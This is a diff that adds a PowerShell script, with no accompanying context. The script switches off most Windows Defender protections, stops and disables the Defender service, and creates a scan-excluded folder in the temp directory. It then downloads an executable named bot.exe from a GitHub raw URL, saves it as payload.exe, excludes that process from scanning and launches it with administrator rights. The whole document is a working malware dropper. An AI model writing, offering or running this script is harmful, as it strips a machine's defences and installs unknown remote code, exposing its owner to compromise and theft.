@@ -1,0 +1,21 @@
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableBehaviorMonitoring $true
+Set-MpPreference -DisableBlockAtFirstSeen $true
+Set-MpPreference -DisableIOAVProtection $true
+Set-MpPreference -DisablePrivacyMode $true
+Set-MpPreference -EnableControlledFolderAccess Disabled
+
+Stop-Service WinDefend -Force
+sc config WinDefend start= disabled
+
+$systemPath = [System.IO.Path]::Combine($env:temp, "System")
+New-Item -Path $systemPath -ItemType Directory -Force
+
+Add-MpPreference -ExclusionPath $systemPath
+
+$fileUrl = "https://github.com/blackcode2290/test/raw/refs/heads/main/bot.exe"
+$filePath = [System.IO.Path]::Combine($systemPath, "payload.exe")
+
+Invoke-WebRequest -Uri $fileUrl -OutFile $filePath
+Add-MpPreference -ExclusionProcess $filePath
+Start-Process -FilePath $filePath -Verb RunAs
